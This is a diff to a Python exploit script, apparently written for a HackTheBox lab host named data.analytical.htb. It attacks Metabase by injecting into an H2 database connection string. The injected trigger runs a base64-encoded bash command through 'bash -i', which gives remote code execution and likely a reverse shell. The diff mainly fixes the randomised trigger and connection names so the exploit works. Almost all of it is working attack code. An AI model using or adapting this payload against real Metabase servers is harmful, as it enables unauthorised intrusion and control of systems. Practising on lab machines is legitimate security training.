@@ -2,6 +2,7 @@ import requests
 import sys
 import subprocess
 import random
+import string
 import json
 import base64
 
@@ -10,6 +11,8 @@ if len(sys.argv) < 2:
     sys.exit(1)
 
 rnb = random.randint(100000, 999999)
+rstr = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
+
 # Define the URL
 url = "http://data.analytical.htb/"
 
@@ -54,12 +57,12 @@ data = {
     "token": token,
     "details": {
         "details": {
-            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER" + f" rnb " + "BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + final_base64_encoded + "}|{base64,-d}|{bash,-i}')\n$$--=x",
+            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER " + rstr + " BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + final_base64_encoded + "}|{base64,-d}|{bash,-i}')\n$$--=x",
             "advanced-options": False,
             "ssl": True
         },
         "engine": "h2",
-        "name": f"rnb"
+        "name": rnb
     }
 }
 
